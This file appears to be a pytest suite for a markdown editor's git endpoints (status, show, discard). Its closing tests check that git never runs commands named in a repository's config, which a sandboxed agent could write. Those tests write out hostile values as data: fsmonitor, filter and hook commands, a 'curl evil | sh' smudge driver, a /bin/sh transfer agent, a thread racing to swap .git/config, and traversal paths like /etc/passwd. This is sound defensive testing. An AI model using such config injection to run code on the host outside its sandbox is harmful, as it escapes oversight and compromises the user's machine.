"""Source control: /api/git/info, /api/git/status in its two base modes, /api/git/show and
/api/git/discard, on temporary repositories, with ROOT the top of the work tree or a folder in it.
One server for the module; each test opens its own repository."""
import os
import threading
from urllib.parse import urlencode

import pytest

from gitutil import SERVER_ENV, commit, git, make_repo, open_root, write
from helpers import needs_linux

RENAMED = "a line long enough for git to see the file as renamed\n" * 3


@pytest.fixture(scope="module")
def srv(shared_servers):
    return shared_servers.start(env=SERVER_ENV)


def get(srv, endpoint, **params):
    return srv.get(f"{endpoint}?{urlencode(params)}" if params else endpoint)


def info(srv):
    status, res = get(srv, "/api/git/info")
    assert status == 200, res
    return res


def status_of(srv, base="head"):
    status, res = get(srv, "/api/git/status", base=base)
    assert status == 200, res
    return res


def changes(res):
    return {f["path"]: (f["status"], f.get("old_path")) for f in res["files"]}


def show(srv, **params):
    status, res = get(srv, "/api/git/show", **params)
    assert status == 200, res
    return res


def discard(srv, **body):
    return srv.post("/api/git/discard", body)


def sha(repo, rev="HEAD"):
    return git(repo, "rev-parse", rev).strip()


# ---------------------------------------------------------------- info

def test_outside_a_repo(srv, tmp_path):
    plain = tmp_path / "plain"
    write(plain, {"a.md": "a"})
    open_root(srv, plain)
    assert info(srv) == {"repo": False}
    assert status_of(srv) == {"repo": False, "base": None, "files": [], "outside": 0}
    status, res = get(srv, "/api/git/show", path="a.md")
    assert status == 400 and "not a git repository" in res["error"]
    assert discard(srv, path="a.md")[0] == 400 and (plain / "a.md").exists()


def test_info_names_the_branch_head_and_default_branch(srv, tmp_path):
    repo = make_repo(tmp_path / "repo", {"a.md": "a\n", "sub/b.md": "b\n"})
    head = sha(repo)
    open_root(srv, repo)
    assert info(srv) == {"repo": True, "top": str(repo), "root_rel": "", "branch": "main", "head": head,
                         "default_branch": "main", "is_default": True}
    git(repo, "checkout", "-q", "-b", "feature")
    i = info(srv)
    assert (i["branch"], i["head"], i["default_branch"], i["is_default"]) == ("feature", head, "main", False)
    git(repo, "checkout", "-q", "--detach")
    i = info(srv)
    assert (i["branch"], i["head"], i["is_default"]) == (None, head, False)
    open_root(srv, repo / "sub")
    i = info(srv)
    assert (i["top"], i["root_rel"]) == (str(repo), "sub")


def test_default_branch_detection(srv, tmp_path):
    repo = make_repo(tmp_path / "repo", {"a": "1"}, branch="trunk")
    head = sha(repo)
    open_root(srv, repo)

    def dflt():
        i = info(srv)
        return i["default_branch"], i["is_default"]
    assert dflt() == (None, False), "no origin/HEAD, main or master"
    git(repo, "update-ref", "refs/remotes/origin/main", head)
    assert dflt() == ("origin/main", False), "origin's main when there is no local one"
    git(repo, "branch", "master")
    assert dflt() == ("master", False), "a local branch first"
    git(repo, "branch", "main")
    assert dflt() == ("main", False), "main before master"
    git(repo, "update-ref", "refs/remotes/origin/trunk", head)
    git(repo, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/trunk")
    assert dflt() == ("origin/trunk", True), "origin/HEAD wins; HEAD is on trunk"
    git(repo, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/gone")
    assert dflt() == ("main", False), "a dangling origin/HEAD is skipped"


def test_before_the_first_commit(srv, tmp_path):
    repo = make_repo(tmp_path / "repo")
    write(repo, {"a.md": "a\n", "b.md": "b\n"})
    git(repo, "add", "a.md")
    open_root(srv, repo)
    i = info(srv)
    assert (i["branch"], i["head"], i["default_branch"], i["is_default"]) == ("main", None, None, False)
    res = status_of(srv)
    assert res["base"] == {"mode": "head", "ref": "HEAD", "sha": None, "label": "HEAD"}
    assert changes(res) == {"a.md": ("A", None), "b.md": ("U", None)}
    assert "no default branch" in status_of(srv, "branch")["base"]["note"]
    assert show(srv, path="a.md") == {"exists": False, "binary": False}
    assert discard(srv, path="a.md") == (200, {"ok": True})
    assert not (repo / "a.md").exists() and git(repo, "ls-files") == ""


# ---------------------------------------------------------------- status

def test_uncommitted_changes_against_head(srv, tmp_path):
    repo = make_repo(tmp_path / "repo", {".gitignore": "*.log\n", "mod.txt": "m\n", "idx.txt": "i\n", "gone.txt": "g\n",
                                         "rm.txt": "r\n", "orig.txt": RENAMED, "cached.txt": "c\n", "same.txt": "s\n"})
    for key, value in (("color.ui", "always"), ("diff.relative", "true"), ("status.showUntrackedFiles", "no"),
                       ("status.relativePaths", "true")):
        git(repo, "config", key, value)  # settings that must not change what the server sees
    write(repo, {"mod.txt": "m2\n", "idx.txt": "i2\n", "new.txt": "n\n", "staged.txt": "s\n", "untr.txt": "u\n",
                 "dir/deep/u2.txt": "u\n", "x.log": "ignored\n"})
    git(repo, "add", "idx.txt", "new.txt", "staged.txt")
    (repo / "staged.txt").unlink()            # added, then deleted: no change against HEAD
    (repo / "gone.txt").unlink()
    git(repo, "rm", "-q", "rm.txt")
    git(repo, "mv", "orig.txt", "moved.txt")
    git(repo, "rm", "-q", "--cached", "cached.txt")   # deleted from the index, still in the work tree
    open_root(srv, repo)
    res = status_of(srv)
    assert res["repo"] is True and res["outside"] == 0
    assert res["base"] == {"mode": "head", "ref": "HEAD", "sha": sha(repo), "label": "HEAD"}
    assert changes(res) == {"mod.txt": ("M", None), "idx.txt": ("M", None), "new.txt": ("A", None),
                            "gone.txt": ("D", None), "rm.txt": ("D", None), "moved.txt": ("R", "orig.txt"),
                            "cached.txt": ("M", None), "untr.txt": ("U", None), "dir/deep/u2.txt": ("U", None)}
    assert [f["path"] for f in res["files"]] == sorted(changes(res)), "sorted by path"
    assert "truncated" not in res


def test_conflicts(srv, tmp_path):
    repo = make_repo(tmp_path / "repo", {"c.txt": "base\n", "ok.txt": "ok\n"})
    git(repo, "checkout", "-q", "-b", "other")
    write(repo, {"c.txt": "theirs\n"})
    commit(repo)
    git(repo, "checkout", "-q", "main")
    write(repo, {"c.txt": "mine\n"})
    commit(repo)
    git(repo, "merge", "-q", "other", check=False)
    open_root(srv, repo)
    assert changes(status_of(srv)) == {"c.txt": ("C", None)}
    assert show(srv, path="c.txt")["text"] == "mine\n"
    assert discard(srv, path="c.txt") == (200, {"ok": True})
    assert (repo / "c.txt").read_text() == "mine\n" and status_of(srv)["files"] == []


def test_root_in_a_subfolder_counts_changes_outside(srv, tmp_path):
    repo = make_repo(tmp_path / "repo", {"docs/a.md": "a\n", "docs/same.md": "s\n", "docs/out.md": RENAMED,
                                         "src/x.py": "x\n", "src/in.py": RENAMED.upper(), "top.txt": "t\n"})
    write(repo, {"docs/a.md": "a2\n", "docs/new.md": "n\n", "src/x.py": "x2\n", "src/u.py": "u\n"})
    (repo / "top.txt").unlink()
    git(repo, "mv", "src/in.py", "docs/in.py")     # renamed into ROOT: new there
    git(repo, "mv", "docs/out.md", "src/out.md")   # renamed out of ROOT: gone from it
    open_root(srv, repo / "docs")
    res = status_of(srv)
    assert changes(res) == {"a.md": ("M", None), "new.md": ("U", None), "in.py": ("A", None), "out.md": ("D", None)}
    assert res["outside"] == 5, "src/x.py, src/u.py, top.txt and one side of each rename"
    commit(repo, "everything")
    assert status_of(srv) == {"repo": True, "base": status_of(srv)["base"], "files": [], "outside": 0, "nested": 0}


def test_branch_base_shows_everything_since_the_default_branch(srv, tmp_path):
    repo = make_repo(tmp_path / "repo", {"a.txt": "a\n", "b.txt": "b\n", "c.txt": "c\n", "r.txt": RENAMED,
                                         "main-only.txt": "m\n"})
    git(repo, "checkout", "-q", "-b", "feature")
    write(repo, {"a.txt": "a2\n", "n.txt": "n\n"})
    (repo / "b.txt").unlink()
    git(repo, "mv", "r.txt", "r2.txt")
    commit(repo, "feature work")
    git(repo, "checkout", "-q", "main")
    write(repo, {"main-only.txt": "m2\n"})
    commit(repo, "main moves on")
    git(repo, "checkout", "-q", "feature")
    write(repo, {"c.txt": "c2\n", "u.txt": "u\n"})
    open_root(srv, repo)
    res = status_of(srv, "branch")
    assert res["base"] == {"mode": "branch", "ref": "refs/heads/main", "sha": git(repo, "merge-base", "HEAD", "main").strip(),
                           "label": "main"}
    assert changes(res) == {"a.txt": ("M", None), "n.txt": ("A", None), "b.txt": ("D", None),
                            "r2.txt": ("R", "r.txt"), "c.txt": ("M", None), "u.txt": ("U", None)}
    assert changes(status_of(srv, "head")) == {"c.txt": ("M", None), "u.txt": ("U", None)}
    assert show(srv, path="a.txt", base="branch")["text"] == "a\n"
    assert show(srv, path="r2.txt", old_path="r.txt", base="branch")["text"] == RENAMED
    assert show(srv, path="n.txt", base="branch") == {"exists": False, "binary": False}
    assert show(srv, path="main-only.txt", base="branch")["text"] == "m\n", "the merge-base, not main's tip"
    assert show(srv, path="a.txt")["text"] == "a2\n", "HEAD"


def test_branch_base_in_a_subfolder(srv, tmp_path):
    repo = make_repo(tmp_path / "repo", {"docs/a.md": "a\n", "src/x.py": "x\n"})
    git(repo, "checkout", "-q", "-b", "feature")
    write(repo, {"docs/a.md": "a2\n", "src/x.py": "x2\n", "docs/n.md": "n\n"})
    commit(repo)
    write(repo, {"src/u.py": "u\n", "docs/u.md": "u\n"})
    open_root(srv, repo / "docs")
    res = status_of(srv, "branch")
    assert changes(res) == {"a.md": ("M", None), "n.md": ("A", None), "u.md": ("U", None)}
    assert res["outside"] == 2
    assert show(srv, path="a.md", base="branch")["text"] == "a\n"


def test_branch_base_falls_back_to_uncommitted_with_a_note(srv, tmp_path):
    repo = make_repo(tmp_path / "repo", {"a.txt": "a\n"})
    write(repo, {"a.txt": "a2\n"})
    open_root(srv, repo)
    res = status_of(srv, "branch")
    assert res["base"]["mode"] == "head" and res["base"]["sha"] == sha(repo)
    assert "main is the default branch" in res["base"]["note"]
    assert changes(res) == {"a.txt": ("M", None)}
    git(repo, "checkout", "-q", "--orphan", "lonely")
    commit(repo, "unrelated history")
    res = status_of(srv, "branch")
    assert res["base"]["mode"] == "head" and "no history in common with main" in res["base"]["note"]
    git(repo, "branch", "-q", "-D", "main")
    assert "no default branch" in status_of(srv, "branch")["base"]["note"]
    assert get(srv, "/api/git/status", base="nope")[0] == 400


# ---------------------------------------------------------------- show

def test_show_returns_the_base_version(srv, tmp_path):
    repo = make_repo(tmp_path / "repo", {"t.txt": "one\r\ntwo\r\n", "bin.dat": b"\0\1\2", "gone.txt": "g\n",
                                         "old.txt": RENAMED, "sub/s.md": "s\n", "w[1].txt": "glob\n"})
    write(repo, {"t.txt": "changed\n", "new.txt": "n\n"})
    (repo / "gone.txt").unlink()
    git(repo, "mv", "old.txt", "new-name.txt")
    open_root(srv, repo)
    assert show(srv, path="t.txt") == {"exists": True, "binary": False, "text": "one\ntwo\n"}, "LF, as /api/file gives"
    assert show(srv, path="bin.dat") == {"exists": True, "binary": True}
    assert show(srv, path="new.txt") == {"exists": False, "binary": False}
    assert show(srv, path="gone.txt")["text"] == "g\n"
    assert show(srv, path="new-name.txt", old_path="old.txt")["text"] == RENAMED
    assert show(srv, path="new-name.txt")["exists"] is False
    assert show(srv, path="w[1].txt")["text"] == "glob\n"
    assert show(srv, path="sub")["exists"] is False, "a folder is not a file"
    for params in ({}, {"path": ""}, {"path": "../x"}, {"path": "/etc/passwd"}, {"path": "t.txt", "base": "nope"}):
        assert get(srv, "/api/git/show", **params)[0] == 400, params
    open_root(srv, repo / "sub")
    assert show(srv, path="s.md")["text"] == "s\n"
    assert get(srv, "/api/git/show", path="../t.txt")[0] == 400, "ROOT is the limit, not the repo"


# ---------------------------------------------------------------- discard

def test_discard_makes_files_match_head(srv, tmp_path):
    repo = make_repo(tmp_path / "repo", {"m.txt": "m\n", "s.txt": "s\n", "d.txt": "d\n", "r.txt": RENAMED,
                                         "w*.txt": "star\n", "wide.txt": "w\n", "sub/k.txt": "k\n"})
    write(repo, {"m.txt": "m2\n", "s.txt": "s2\n", "u.txt": "u\n", "a.txt": "a\n", "w*.txt": "star2\n",
                 "wide.txt": "w2\n", "sub/k.txt": "k2\n"})
    git(repo, "add", "s.txt", "a.txt")
    (repo / "d.txt").unlink()
    git(repo, "mv", "r.txt", "r2.txt")
    open_root(srv, repo)
    for path in ("m.txt", "s.txt", "d.txt", "u.txt", "a.txt"):
        assert discard(srv, path=path) == (200, {"ok": True}), path
    assert discard(srv, path="r2.txt", old_path="r.txt") == (200, {"ok": True})
    assert discard(srv, path="w*.txt") == (200, {"ok": True})
    assert (repo / "w*.txt").read_text() == "star\n" and (repo / "wide.txt").read_text() == "w2\n", \
        "the path is literal, not a glob"
    assert changes(status_of(srv)) == {"wide.txt": ("M", None), "sub/k.txt": ("M", None)}
    assert [(repo / f).read_text() for f in ("m.txt", "s.txt", "d.txt", "r.txt")] == ["m\n", "s\n", "d\n", RENAMED]
    assert not any((repo / f).exists() for f in ("u.txt", "a.txt", "r2.txt"))
    assert git(repo, "diff", "--cached", "--name-only") == "", "the index matches HEAD again"
    open_root(srv, repo / "sub")
    assert discard(srv, path="k.txt") == (200, {"ok": True}) and (repo / "sub/k.txt").read_text() == "k\n"


def test_discard_refusals(srv, tmp_path):
    repo = make_repo(tmp_path / "repo", {"a.txt": "a\n", "sub/b.txt": "b\n"})
    write(repo, {"a.txt": "a2\n", "sub/b.txt": "b2\n"})
    open_root(srv, repo / "sub")
    for body in ({"path": ""}, {"path": "."}, {"path": "../a.txt"}, {"path": str(repo / "a.txt")}, {},
                 {"path": "b.txt", "old_path": "../a.txt"}):
        assert discard(srv, **body)[0] == 400, body
    (repo / "sub/folder").mkdir()
    assert discard(srv, path="folder")[0] == 400
    open_root(srv, repo)
    assert discard(srv, path="sub")[0] == 400, "not a whole folder"
    assert discard(srv, path=".git/config")[0] == 400
    assert (repo / "a.txt").read_text() == "a2\n" and (repo / "sub/b.txt").read_text() == "b2\n"


# ---------------------------------------------------------------- nested repositories

def test_nested_repositories_are_not_listed_as_changes(srv, tmp_path):
    """An untracked repository inside this one (a cloned dependency, a linked worktree) is one
    `dir/` entry to git status, which the panel could neither open nor discard: it is counted."""
    repo = make_repo(tmp_path / "repo", {"a.txt": "a\n"})
    make_repo(repo / "vendor" / "lib", {"x.txt": "x\n"})
    git(repo, "worktree", "add", "-q", "-b", "side", str(repo / "wt"))
    write(repo, {"a.txt": "a2\n", "new.txt": "n\n"})
    open_root(srv, repo)
    res = status_of(srv)
    assert changes(res) == {"a.txt": ("M", None), "new.txt": ("U", None)}
    assert res["nested"] == 2
    git(repo, "checkout", "-q", "-b", "feature")
    res = status_of(srv, "branch")
    assert res["base"]["mode"] == "branch" and changes(res) == {"a.txt": ("M", None), "new.txt": ("U", None)}
    assert res["nested"] == 2


# ---------------------------------------------------------------- commands named by the repository

def test_git_runs_no_command_that_the_repositorys_config_names(srv, tmp_path):
    """md-editor runs git outside the sandbox that Claude runs in, and the sandbox can write
    .git/config, .git/info/attributes and .git/hooks: an fsmonitor hook, filter drivers and
    hooks must not run, whatever the page asks for."""
    repo = make_repo(tmp_path / "repo", {"a.txt": "a\n", "b.txt": "b\n", ".gitignore": "*.log\n"})
    git(repo, "checkout", "-q", "-b", "feature")
    marks = tmp_path / "marks"
    marks.mkdir()
    git(repo, "config", "core.fsmonitor", f"touch {marks}/fsmonitor; false")
    git(repo, "config", "filter.x.clean", f"touch {marks}/clean; cat")
    git(repo, "config", "filter.x.smudge", f"touch {marks}/smudge; cat")
    git(repo, "config", "filter.x.required", "true")
    git(repo, "config", "filter.y.process", f"touch {marks}/process")
    (repo / ".git/info/attributes").write_text("*.txt filter=x\n*.md filter=y\n")
    hook = repo / ".git/hooks/post-checkout"
    hook.write_text(f"#!/bin/sh\ntouch {marks}/hook\n")
    hook.chmod(0o755)
    write(repo, {"a.txt": "a2\n", "c.md": "c\n"})
    open_root(srv, repo)
    for endpoint, params in (("/api/tree", {"dir": ""}), ("/api/allfiles", {}), ("/api/search", {"q": "a"}),
                             ("/api/search", {"q": "a", "regex": "1"}), ("/api/git/status", {"base": "head"}),
                             ("/api/git/status", {"base": "branch"}), ("/api/git/show", {"path": "a.txt"})):
        assert get(srv, endpoint, **params)[0] == 200, endpoint
    assert changes(status_of(srv)) == {"a.txt": ("M", None), "c.md": ("U", None)}
    assert discard(srv, path="a.txt")[0] == 200
    assert (repo / "a.txt").read_text() == "a\n"
    assert sorted(p.name for p in marks.iterdir()) == []
    git(repo, "status")   # the check is a real one: git itself runs them
    assert "fsmonitor" in {p.name for p in marks.iterdir()}


def test_frozen_config_drops_drivers_but_keeps_git_lfs(tmp_path, monkeypatch):
    """The frozen config a FILTER_CMD runs against carries only safe core/extensions/index settings
    and Git LFS's exact filter; every other clean/smudge driver the agent writes is left out, so it
    cannot run on the host even though git re-reads config after md-editor built the frozen copy."""
    import subprocess
    from md_collab_editor import server as S
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(tmp_path / "gitconfig"))
    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
    repo = make_repo(tmp_path / "repo")
    frozen = tmp_path / "frozen"

    def filters():
        """filter.* keys of the config md-editor would make git read for this repo."""
        if frozen.exists():
            frozen.unlink()
        S.write_frozen_config(repo, str(frozen))
        r = subprocess.run(["git", "config", "--file", str(frozen), "--no-includes", "-z",
                            "--get-regexp", r"^filter\."], capture_output=True)
        out = {}
        for item in r.stdout.split(b"\0"):
            if item:
                k, _, v = item.decode().partition("\n")
                out[k] = v
        return out

    assert filters() == {}
    assert S.git_env()["GIT_LFS_SKIP_SMUDGE"] == "1", "git-lfs never downloads, so runs no transfer agent"
    lfs = {"clean": "git-lfs clean -- %f", "smudge": "git-lfs smudge -- %f",
           "process": "git-lfs filter-process", "required": "true"}
    for k, v in lfs.items():
        git(repo, "config", f"filter.lfs.{k}", v)
    assert filters() == {f"filter.lfs.{k}": v for k, v in lfs.items()}, "LFS as `git lfs install` sets it up is kept"
    # git-lfs runs commands of its own that the same configuration names: then LFS is left out too
    for key, value in (("lfs.extension.x.clean", "touch pwned"), ("lfs.Extension.X.smudge", "touch pwned"),
                       ("lfs.customtransfer.x.path", "/bin/sh"), ("lfs.standalonetransferagent", "x"),
                       ("LFS.StandaloneTransferAgent", "x")):
        git(repo, "config", key, value)
        assert filters() == {}, key
        git(repo, "config", "--unset", key)
        assert "filter.lfs.clean" in filters(), key
    git(repo, "config", "lfs.url", "https://example.com/lfs")   # plain settings are fine
    assert "filter.lfs.clean" in filters()
    # an attacker's own driver, and a tampered LFS smudge → neither reaches the frozen config
    git(repo, "config", "filter.lfs.smudge", "curl evil | sh")
    git(repo, "config", "filter.My.Driver.clean", "x")
    git(repo, "config", "filter.a=b.clean", "x")   # a subsection name with = is no longer a problem
    assert filters() == {}


@needs_linux
def test_status_and_discard_never_run_a_racing_filter_driver(tmp_path):
    """SEC-GIT-001: the agent fully controls .git/config and swaps it (os.replace) between a benign
    copy and one with a clean/smudge driver while Source Control polls git status and the user
    discards. Pre-fix, git() read the config to build its -c blanking in one subprocess and then ran
    the command in another, so a flip in the window let the driver run on the host. Now a FILTER_CMD
    runs against a frozen, agent-unwritable copy of the config, so the driver never runs however the
    real .git/config is flipped underneath. The marker directory stays empty."""
    from md_collab_editor import server as S
    repo = make_repo(tmp_path / "repo", {"data.txt": "original\n", ".gitattributes": "data.txt filter=evil\n"})
    (repo / "data.txt").write_text("modified\n")   # tracked and modified: git runs the clean filter
    out = tmp_path / "pwned"
    out.mkdir()
    cfg = repo / ".git" / "config"
    base = cfg.read_text()
    evil = base + (f'[filter "evil"]\n\tclean = touch "{out}/PWNED_$$"; cat\n'
                   f'\tsmudge = touch "{out}/PWNED_$$"; cat\n\trequired = true\n')
    stop = threading.Event()

    def flip():
        tmp = repo / ".git" / "config.flip"
        while not stop.is_set():
            for text in (evil, base):
                tmp.write_text(text)
                os.replace(tmp, cfg)

    t = threading.Thread(target=flip)
    t.start()
    try:
        for _ in range(60):
            S.git(["status", "--porcelain=v2", "-z", "--untracked-files=all"], repo)
        for _ in range(20):
            S.git(["restore", "--source=HEAD", "--staged", "--worktree", "--", "data.txt"], repo, literal=True)
    finally:
        stop.set()
        t.join()
    cfg.write_text(base)
    assert sorted(p.name for p in out.iterdir()) == [], "a filter driver ran on the host during the race"
